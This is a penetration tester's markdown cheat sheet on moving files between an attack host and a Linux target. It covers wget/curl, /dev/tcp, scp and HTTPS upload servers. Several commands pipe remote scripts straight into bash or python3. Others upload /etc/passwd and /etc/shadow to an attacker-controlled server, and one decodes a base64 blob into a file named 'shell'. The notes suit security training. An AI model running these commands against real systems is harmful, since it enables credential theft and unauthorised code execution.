## delete


# OPEN SERVER:
## PYTHON:
- `python3 -m http.server 1234` local machine

# WGET
- `wget http://10.10.14.1:8000/linenum.sh` target machine
- `curl http://10.10.14.1:8000/linenum.sh -o` linenum.sh

# SCP
- `scp linenum.sh user@remotehost:/tmp/linenum.sh` local machine

# Attack to Target
## Base64 Encoding / Decoding
**Encode SSH Key to Base64**
```bash
$ cat id_rsa |base64 -w 0;echo`
```

**Decode the File**
```bash
$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`
```

**Confirm the MD5 Hashes Match**
```bash
$ md5sum id_rsa
```

## Web Downloads with Wget and cURL
**Download a File Using wget**
```bash
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
```

**Download a File Using cURL**
```bash
$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
```

## Fileless Attacks Using Linux
**Fileless Download with cURL**
```bash
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
```

**Fileless Download with wget**
```bash
$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`
```
## Download with Bash (/dev/tcp)
**Connect to the Target Webserver**
```bash
$ exec 3<>/dev/tcp/10.10.10.32/80`
```

**HTTP GET Request**
```bash
$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
```

**Print the Response**
```bash
$ cat <&3`
```

## SSH Downloads
SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.

SCP (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

SCP is very similar to copy or cp, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.

**Enabling the SSH Server**
```bash
$ sudo systemctl enable ssh`
```

**Starting the SSH Server**
```bash
$ sudo systemctl start ssh`
```

**Checking for SSH Listening Port**
```bash
$ netstat -lnpt`
```

**Downloading Files Using SCP**
```bash
$ scp plaintext@192.168.49.128:/root/myroot.txt . `
```

`Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.`

# Target to Attack
## Web Upload
**Attack - Start Web Server**
```bash
$ sudo python3 -m pip install --user uploadserver`
```

**Attack - Create a Self-Signed Certificate**
```bash
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
```

`The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.`

**Attack - Start Web Server**
```bash
$ mkdir https && cd https
$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```

**Target - Upload Multiple Files**
```bash
$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Alternative Web File Transfer Method
**Target - Creating a Web Server with Python3**
```bash
$ python3 -m http.server
```

**Target - Creating a Web Server with Python2.7**
```bash
$ python2.7 -m SimpleHTTPServer
```

**Target - Creating a Web Server with PHP**
```bash
$ php -S 0.0.0.0:8000
```

**Target - Creating a Web Server with Ruby**
```bash
$ ruby -run -ehttpd . -p8000
```

**Download the File from the Target Machine onto the Attack**
```bash
$ wget 192.168.49.128:8000/filetotransfer.txt
```

## SCP Upload
**File Upload using SCP**
```bash
$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```

```bash
scp -P 3520 usuario@192.168.49.128:/home/usuario/arquivo.txt .
```
